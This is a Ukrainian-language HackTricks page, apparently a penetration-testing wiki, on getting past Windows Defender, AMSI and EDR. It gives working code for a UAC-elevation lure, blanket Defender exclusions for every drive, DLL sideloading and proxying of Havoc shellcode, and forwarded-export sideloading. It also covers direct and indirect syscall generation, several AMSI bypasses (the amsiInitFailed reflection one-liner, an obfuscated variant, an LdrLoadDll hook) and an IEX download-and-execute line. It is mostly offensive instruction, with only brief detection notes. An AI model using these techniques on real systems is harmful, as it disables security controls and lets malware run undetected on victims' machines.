# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, який імітує роботу іншого AV.
- [Вимкнути Defender, якщо у вас є права адміністратора](basic-powershell-for-pentesters/README.md)

### Приманка з UAC у стилі інсталятора перед втручанням у роботу Defender

Публічні loaders, що видають себе за чити для ігор, часто постачаються у вигляді непідписаних інсталяторів Node.js/Nexe, які спочатку **запитують у користувача підвищення прав**, а потім нейтралізують Defender. Схема проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише тоді, коли користувач має права адміністратора, тож невдача означає, що loader запущено від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуване підтвердження UAC, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви й так вважають, що встановлюють «cracked»-програмне забезпечення, тож зазвичай приймають запит і надають malware потрібні права, щоб змінити політику Defender.<sup>[[26]](#references)</sup>

### Масові виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader збільшують кількість сліпих зон Defender, а не вимикають службу повністю. Спершу loader завершує роботу GUI-сторожа (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб сканування не охоплювало жоден профіль користувача, системний каталог чи знімний диск:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Цикл проходить кожну підключену файлову систему (D:\, E:\, USB-накопичувачі тощо), тому **будь-який payload, який згодом буде розміщено будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` розраховане на майбутнє: зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не змінюючи налаштувань Defender.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож на наступних етапах можна перевірити, чи збереглися виключення, або розширити їх, не викликаючи UAC повторно.

Оскільки жодну службу Defender не зупинено, наївні перевірки стану й далі повідомлятимуть, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Зараз AV використовують різні методи для перевірки файлів на наявність шкідливого вмісту: статичне виявлення, динамічний аналіз, а в більш просунутих EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також отримання інформації безпосередньо з файла (наприклад, опису файла, назви компанії, цифрових підписів, іконки, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували та позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати й запустити програму в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб обійти AV, але залежно від того, що саме ви намагаєтеся обфускувати, це може забрати багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, відомих шкідливих сигнатур не буде, але це потребує багато часу й зусиль.

> [!TIP]
> Для перевірки на статичне виявлення Windows Defender добре підійде [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і доручає Defender сканувати кожен окремо, щоб точно визначити, які рядки чи байти в бінарному файлі позначаються як шкідливі.

Наполегливо рекомендую переглянути цей [плейлист YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### Офлайн-тести PE-ознак для статичних класифікаторів

Байти упакованого або зашифрованого payload — лише один із типів даних, які використовує статичний класифікатор. EMBER2024 збирає PE-ознаки, зокрема імпорти, експорти, секції, заголовки й дані Authenticode.<sup>[[48]](#references)</sup> В одному експерименті з loader додавання 141 імпорту, що виглядали нешкідливими, знизило оцінку шкідливості EMBER2024 на 93%, тоді як імпорти, пов’язані зі шкідливим ПЗ, підвищили її. Це результат для цієї моделі й цих зразків, а не надійний спосіб обійти конкретний продукт AV/EDR.<sup>[[50]](#references)</sup>

Під час авторизованого тестування loader залишайте payload і шлях виконання незмінними, змінюйте одну заплановану змінну збірки для кожного варіанта й порівнюйте оцінки офлайн. Перевіряйте отримані PE-ознаки, оскільки зміна збірки може вплинути на кілька груп ознак.<sup>[[49]](#references)[[50]](#references)</sup> Щоб потрібні імпорти залишалися в IAT, викликайте вибрані Win32 API з доступного для виконання коду. Змінюйте набір API та розподіляйте місця викликів між збірками, а не створюйте незмінну функцію маскування, яка може стати сигнатурою. В експерименті також повідомлялося про нижчі оцінки за наявності дійсного підпису коду, записів експорту й більшої кількості функцій, що збільшують `.pdata`; недійсний підпис майже не впливав, а ефект `.pdata` був незначним.<sup>[[50]](#references)</sup>

Пакет `thrember` надає засоби для вилучення ознак і еталонні моделі. Після встановлення скористайтеся `thrember.download_models("models")` із наявним каталогом `models`, а потім запустіть оцінювач із батьківського каталогу: допоміжна функція завантаження змінює поточний робочий каталог. PE-класифікатор може оцінювати каталог зі збірками, не надсилаючи їх до сервісу сканування:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Під час порівняння не змінюйте версії моделі та feature-extractor. Нижчий офлайн-показник лише свідчить про реакцію цього класифікатора на змінений бінарний файл; він не доводить ухилення від поведінкового аналізу, емуляції чи іншої моделі постачальника.<sup>[[49]](#references)[[50]](#references)</sup> Про [поліморфізм для кожної збірки та маскування зовнішнього бінарного файла у віртуалізованих payload](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) читайте в окремій моделі виконання.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі браузера, створенням minidump для LSASS тощо). Із цим може бути трохи складніше працювати, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox AV можуть пропустити затримку — залежно від її реалізації.
- **Перевірка ресурсів машини** Зазвичай sandbox має дуже обмежені ресурси (наприклад, < 2GB RAM), інакше він може сповільнити роботу машини користувача. Тут також можна проявити винахідливість: наприклад, перевірити температуру CPU або навіть швидкість обертання вентиляторів — не все це буде реалізовано в sandbox.
- **Перевірки, специфічні для машини** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо він не збігається, програму можна завершити.

Виявилося, що ім’я комп’ютера в sandbox Microsoft Defender — HAL9TH. Тож перед детонацією malware можна перевірити ім’я комп’ютера: якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програму можна завершити.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій статті, **public tools** рано чи пізно **почнуть виявляти**, тож запитайте себе:

Наприклад, якщо ви хочете створити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який також створює дамп LSASS?

Імовірно, правильна відповідь — другий варіант. Для прикладу, mimikatz — це, мабуть, одна з найбільш виявлюваних AV та EDR шкідливих програм, якщо не найбільш виявлювана. Хоч сам проєкт і дуже крутий, обійти AV, використовуючи його, надзвичайно складно, тому просто пошукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Щоб модифікувати payload для ухилення від виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛИ НА VIRUSTOTAL**, якщо ваша мета — досягти тривалого ухилення від виявлення. Якщо ви хочете перевірити, чи виявляє ваш payload певний AV, установіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXE проти DLL

Коли це можливо, завжди **віддавайте перевагу DLL для ухилення від виявлення**. З мого досвіду, DLL-файли зазвичай **набагато рідше виявляються** й аналізуються, тож у деяких випадках це простий спосіб уникнути виявлення (якщо ваш payload можна запускати як DLL, звісно).

Як видно на цьому зображенні, рівень виявлення DLL Payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного EXE payload від Havoc і звичайної DLL від Havoc</p></figcaption></figure>

Далі покажемо кілька трюків із DLL-файлами, які допоможуть бути значно непомітнішими.

## Підміна DLL та проксування

**DLL Sideloading** використовує порядок пошуку DLL, яким керується loader, розміщуючи вразливу програму та шкідливий payload поруч.

Виявити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого скрипту PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\" , вразливих до DLL hijacking, і DLL-файлів, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка доволі непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко виявити.

Якщо просто розмістити шкідливу DLL з назвою, яку програма очікує завантажити, ваш payload не завантажиться, оскільки програма очікує наявності в цій DLL певних функцій. Щоб вирішити цю проблему, ми скористаємося іншою технікою під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма робить до proxy DLL (шкідливої DLL), до оригінальної DLL. Це зберігає функціональність програми та дає змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL зі зміненою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають показник виявлення 0/26 на [antiscan.me](https://antiscan.me)! Вважаю, це успіх.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [VOD S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорили.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість посилання на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликаючий код знаходить цей експорт, Windows loader:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Знаходить у ньому `TargetFunc`

Важливі особливості:
- Якщо `TargetDll` є KnownDLL, його надає захищений простір імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує перенаправлення.

Це дає змогу використати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з назвою, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із контрольованою зловмисником DLL, назва якої точно збігається з назвою цільового модуля перенаправлення. Коли викликається перенаправлений експорт, loader обробляє перенаправлення та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його пошук виконується у звичайному порядку.

PoC (копіюйте та вставляйте):
1) Скопіюйте підписану системну DLL до папки, доступної для запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливий `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної DllMain; реалізовувати функцію, на яку передається виклик, щоб запустити DllMain, не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть переспрямування за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` з `C:\test` і виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після виконання `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, цільовий модуль яких не є KnownDLL. KnownDLL перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перелічити forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентаризацію форвардерів Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із несистемних шляхів, а потім завантажують із цього каталогу DLL, що не належать до KnownDLLs, але мають таку саму базову назву
- Створюйте сповіщення про ланцюжки процесів/модулів, як-от: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в каталогах застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для payload, призначений для обходу EDR за допомогою призупинених процесів, прямих системних викликів та альтернативних методів виконання`

За допомогою Freeze можна приховано завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тож ніколи не покладайтеся лише на один інструмент і, якщо можливо, спробуйте поєднати кілька технік evasion.

## Прямі/непрямі Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **прямі** або **непрямі** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked entrypoint експорту.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: вставити інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до експорту `ntdll`).
- **Indirect**: перейти до наявного syscall gadget у `ntdll`, щоб перехід у режим ядра виглядав так, ніби його ініційовано з `ntdll` (корисно для evasion на основі евристик); **randomized indirect** вибирає gadget із набору для кожного виклику.
- **Egg-hunt**: уникнути вбудовування статичної послідовності opcode `0F 05` на диск; визначати syscall-послідовність під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальною адресою замість читання байтів stub.
- **SyscallsFromDisk**: зіставити чистий `\KnownDlls\ntdll.dll`, прочитати SSN з його `.text`, а потім скасувати зіставлення (обхід усіх hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN за сортуванням VA з перевіркою opcode, коли stub чистий; якщо на ньому є hook, перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH для захоплення SSN з `EAX` під час виконання, не аналізуючи байти з hooks.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

When парсите clean x64 `ntdll` syscall exports для SSN, враховуйте обидва варіанти: `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) і ту саму послідовність із префіксом `F3 0F 1E FA` (`endbr64`). Останній варіант — stub із префіксом CET: парсер, який припускає, що SSN завжди розташований за фіксованим зміщенням, його пропустить. Якщо ініціалізація indirect-syscall завершується помилкою й loader переходить до `GetProcAddress`, виклики через ці exports знову можуть натрапити на user-mode hooks.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI створили для захисту від «[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)». Спочатку AV могли сканувати лише **файли на диску**, тому, якби вам вдалося виконати payload **безпосередньо в пам’яті**, AV не змогли б цьому завадити, оскільки не мали б достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або інсталяції ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне обчислення коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Вона дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому й необфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: перед шляхом до виконуваного файла, з якого запущено скрипт, додається `amsi:`. У цьому випадку це powershell.exe.

Ми не записували жодного файла на диск, але все одно були виявлені в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також проходить через AMSI. Це стосується навіть завантаження коду для виконання в пам’яті за допомогою `Assembly.Load(byte[])`. Тому для виконання в пам’яті, якщо ви хочете уникнути AMSI, рекомендовано використовувати нижчі версії .NET (наприклад, 4.7.2 або старіші).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI здатна знімати обфускацію зі скриптів навіть за наявності кількох її рівнів, тож залежно від способу обфускації цей варіант може бути невдалим. Через це обхід не такий простий. Іноді достатньо змінити кілька імен змінних, але все залежить від того, наскільки щось було позначено.

- **Обхід AMSI**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її легко підмінити, навіть працюючи без привілеїв. Через цю ваду реалізації AMSI дослідники знайшли кілька способів уникнути сканування AMSI.

**Примусове спричинення помилки**

Якщо примусово завершити ініціалізацію AMSI помилкою (`amsiInitFailed`), сканування для поточного процесу не запускатиметься. Спочатку про цей спосіб повідомив [Matt Graeber](https://twitter.com/mattifestation), а Microsoft розробила сигнатуру, щоб запобігти його масовому використанню.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Усе, що знадобилося, — один рядок коду powershell, щоб зробити AMSI непридатним до використання в поточному процесі powershell. Звісно, сам AMSI позначив цей рядок, тому для використання цієї техніки його потрібно дещо змінити.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Пам’ятайте: цю публікацію, ймовірно, позначать після її виходу, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона передбачає пошук адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезапис її інструкціями, які повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування дорівнює 0, що інтерпретується як чистий результат.

> [!TIP]
> Прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся про них більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) і в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Переспрямування покажчика сканування AMSI COM замість патчингу `AmsiScanBuffer`

Інший обхід, що діє лише в межах процесу, не змінює точку входу `AmsiScanBuffer`. У дослідженому 64-бітному .NET-завантажувачі об’єкт AMSI COM створюється з CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` повертає покажчик на інтерфейс, а слот його vtable зі зміщенням `0x18` використовується як ціль виклику сканування. Завантажувач патчить нативний покажчик для `Console.Clear()` невеликим x64-стабом, змінює цей запис vtable на стаб за допомогою `VirtualProtect()`, а потім відновлює початковий захист сторінки пам’яті. Для цього необхідні 64-бітна ширина покажчика та очікувана структура COM; це не універсальне зміщення для довільних інтерфейсів AMSI або збірок. Раніше спостерігалися такі етапи: [завантаження підписаного сайдкара AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) і [десеріалізація RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Спостережувані байти стаба: `41 C7 00 01 00 00 00 33 C0 C3`: вони записують **1** у покажчик результату в `r8` і повертають **0** у `eax`. Отже, у наведеному твердженні, що результат сканування дорівнює `AMSI_RESULT_CLEAN` (0), змішано значення повернення `S_OK` і вихідне значення переліку. У документованому порядку `AMSI_RESULT` значення **1** відповідає `AMSI_RESULT_NOT_DETECTED`; воно все ще нижче порога виявлення.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Блокування AMSI через запобігання завантаженню amsi.dll (перехоплення LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, — встановити перехоплювач у режимі користувача на `ntdll!LdrLoadDll`, який повертатиме помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і в цьому процесі не відбувається сканування.<sup>[[23]](#references)</sup>

Загальний опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і власними завантажувачами (з усім, що в інших випадках завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувався завантажувачами, запущеними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає виявлення сигнатурою завдяки рандомізованим користувацьким функціям, змінним і виразам із символами, а також випадковому змінюванню регістру символів у ключових словах PowerShell.

**Видалення виявленої сигнатури**

Можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використання PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими техніками:

- **Вимкнути транскрибування PowerShell і журналювання модулів**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тому можна запускати скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обходити засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; рівень покриття залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Кілька технік обфускації передбачають шифрування даних, що підвищує ентропію бінарного файла й полегшує його виявлення засобами AV та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до окремих фрагментів коду, які є чутливими або мають бути приховані.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

